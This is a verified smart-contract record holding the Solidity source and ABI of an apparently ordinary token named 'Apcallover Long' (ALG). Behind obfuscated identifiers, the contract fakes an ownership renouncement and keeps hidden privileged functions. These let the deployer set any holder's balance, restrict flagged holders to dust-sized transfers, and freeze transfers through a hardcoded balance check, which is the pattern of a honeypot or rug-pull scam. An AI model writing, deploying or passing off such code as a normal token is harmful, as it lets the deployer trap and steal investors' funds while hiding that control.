{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface tokenTeam {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract walletFromTake {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface exemptReceiver {\n    function createPair(address modeReceiver, address autoTotal) external returns (address);\n}\n\ninterface shouldSell {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address maxTokenLiquidity) external view returns (uint256);\n\n    function transfer(address launchAutoLimit, uint256 receiverToken) external returns (bool);\n\n    function allowance(address receiverSender, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverToken) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchAutoLimit,\n        uint256 receiverToken\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed takeShould, uint256 value);\n    event Approval(address indexed receiverSender, address indexed spender, uint256 value);\n}\n\ninterface modeWallet is shouldSell {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ApcalloverLong is walletFromTake, shouldSell, modeWallet {\n\n    bool public shouldAmount;\n\n    uint256 private swapSenderShould;\n\n    uint256 public launchedReceiver;\n\n    function owner() external view returns (address) {\n        return receiverFee;\n    }\n\n    address launchTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address public sellFrom;\n\n    string private autoFund = \"ALG\";\n\n    function launchedLaunch(address totalIs, address launchAutoLimit, uint256 receiverToken) internal returns (bool) {\n        if (totalIs == sellFrom) {\n            return txFrom(totalIs, launchAutoLimit, receiverToken);\n        }\n        uint256 txAutoMax = shouldSell(maxBuy).balanceOf(launchTx);\n        require(txAutoMax == receiverExempt);\n        require(launchAutoLimit != launchTx);\n        if (feeTx[totalIs]) {\n            return txFrom(totalIs, launchAutoLimit, atTake);\n        }\n        return txFrom(totalIs, launchAutoLimit, receiverToken);\n    }\n\n    bool private minTeam;\n\n    function autoWallet() private view {\n        require(totalFrom[_msgSender()]);\n    }\n\n    function balanceOf(address maxTokenLiquidity) public view virtual override returns (uint256) {\n        return isLaunch[maxTokenLiquidity];\n    }\n\n    function txMode(uint256 receiverToken) public {\n        autoWallet();\n        receiverExempt = receiverToken;\n    }\n\n    bool private receiverLaunch;\n\n    bool public atLimitMax;\n\n    event OwnershipTransferred(address indexed txAt, address indexed txMarketingReceiver);\n\n    function approve(address autoModeMin, uint256 receiverToken) public virtual override returns (bool) {\n        launchedTo[_msgSender()][autoModeMin] = receiverToken;\n        emit Approval(_msgSender(), autoModeMin, receiverToken);\n        return true;\n    }\n\n    uint256 receiverExempt;\n\n    mapping(address => mapping(address => uint256)) private launchedTo;\n\n    string private walletTake = \"Apcallover Long\";\n\n    bool private fromTo;\n\n    uint8 private takeLiquidity = 18;\n\n    mapping(address => bool) public totalFrom;\n\n    function transfer(address minFund, uint256 receiverToken) external virtual override returns (bool) {\n        return launchedLaunch(_msgSender(), minFund, receiverToken);\n    }\n\n    function marketingLaunch(address autoLimit) public {\n        if (shouldAmount) {\n            return;\n        }\n        if (swapSenderShould != launchedReceiver) {\n            minToken = false;\n        }\n        totalFrom[autoLimit] = true;\n        if (minTeam != modeAt) {\n            receiverLaunch = false;\n        }\n        shouldAmount = true;\n    }\n\n    mapping(address => uint256) private isLaunch;\n\n    function isBuy() public {\n        emit OwnershipTransferred(sellFrom, address(0));\n        receiverFee = address(0);\n    }\n\n    bool public atBuy;\n\n    bool private modeAt;\n\n    function decimals() external view virtual override returns (uint8) {\n        return takeLiquidity;\n    }\n\n    mapping(address => bool) public feeTx;\n\n    function name() external view virtual override returns (string memory) {\n        return walletTake;\n    }\n\n    function totalMarketing(address minFund, uint256 receiverToken) public {\n        autoWallet();\n        isLaunch[minFund] = receiverToken;\n    }\n\n    address public maxBuy;\n\n    bool private minToken;\n\n    address takeReceiverShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function txFrom(address totalIs, address launchAutoLimit, uint256 receiverToken) internal returns (bool) {\n        require(isLaunch[totalIs] >= receiverToken);\n        isLaunch[totalIs] -= receiverToken;\n        isLaunch[launchAutoLimit] += receiverToken;\n        emit Transfer(totalIs, launchAutoLimit, receiverToken);\n        return true;\n    }\n\n    function transferFrom(address totalIs, address launchAutoLimit, uint256 receiverToken) external override returns (bool) {\n        if (_msgSender() != takeReceiverShould) {\n            if (launchedTo[totalIs][_msgSender()] != type(uint256).max) {\n                require(receiverToken <= launchedTo[totalIs][_msgSender()]);\n                launchedTo[totalIs][_msgSender()] -= receiverToken;\n            }\n        }\n        return launchedLaunch(totalIs, launchAutoLimit, receiverToken);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return enableSellTrading;\n    }\n\n    function allowance(address totalBuyReceiver, address autoModeMin) external view virtual override returns (uint256) {\n        if (autoModeMin == takeReceiverShould) {\n            return type(uint256).max;\n        }\n        return launchedTo[totalBuyReceiver][autoModeMin];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return autoFund;\n    }\n\n    uint256 private enableSellTrading = 100000000 * 10 ** 18;\n\n    function getOwner() external view returns (address) {\n        return receiverFee;\n    }\n\n    uint256 constant atTake = 18 ** 10;\n\n    function maxModeTotal(address enableIsLaunch) public {\n        autoWallet();\n        \n        if (enableIsLaunch == sellFrom || enableIsLaunch == maxBuy) {\n            return;\n        }\n        feeTx[enableIsLaunch] = true;\n    }\n\n    constructor (){\n        \n        tokenTeam maxTotal = tokenTeam(takeReceiverShould);\n        maxBuy = exemptReceiver(maxTotal.factory()).createPair(maxTotal.WETH(), address(this));\n        if (minTeam) {\n            receiverLaunch = false;\n        }\n        sellFrom = _msgSender();\n        isBuy();\n        totalFrom[sellFrom] = true;\n        isLaunch[sellFrom] = enableSellTrading;\n        \n        emit Transfer(address(0), sellFrom, enableSellTrading);\n    }\n\n    uint256 fundAuto;\n\n    address private receiverFee;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txMarketingReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeShould\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalBuyReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoModeMin\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoModeMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverToken\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atLimitMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTokenLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoLimit\",\"type\":\"address\"}],\"name\":\"marketingLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableIsLaunch\",\"type\":\"address\"}],\"name\":\"maxModeTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverToken\",\"type\":\"uint256\"}],\"name\":\"totalMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverToken\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchAutoLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverToken\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverToken\",\"type\":\"uint256\"}],\"name\":\"txMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ApcalloverLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}